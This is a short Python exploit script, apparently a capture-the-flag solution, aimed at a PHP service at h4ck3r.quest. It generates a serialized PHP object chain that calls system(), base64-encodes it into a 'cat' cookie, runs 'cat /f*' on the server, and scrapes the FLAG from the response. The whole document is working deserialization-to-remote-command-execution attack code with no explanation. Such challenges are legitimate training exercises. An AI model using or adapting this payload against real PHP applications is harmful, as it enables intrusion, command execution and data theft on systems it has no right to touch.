from subprocess import check_output
from urllib.parse import quote
from base64 import b64encode
from os import getenv
import requests, re

url = 'http://h4ck3r.quest:8602/'
cmd = 'cat /f*'

php_code = '''
class Caster {
    public $cast_func = 'intval';
    function __construct($cast_func) {
        $this->cast_func = $cast_func;
    }
};
class Cat {
    public $magic;
    public $spell;
    function __construct($spell, $magic) {
        $this->magic = $magic;
        $this->spell = $spell;
    }
};
$payload =  new Cat('id', new Caster('system'));
echo serialize($payload);
'''.replace('id', cmd)

payload = check_output(['php','-r',php_code])
# print(payload)
payload = quote(b64encode(payload))
res = requests.get(url, headers={ 'Cookie': 'cat='+payload })
# print(res.text)
flag = re.findall('FLAG{.+}', res.text)[0]
print(flag)
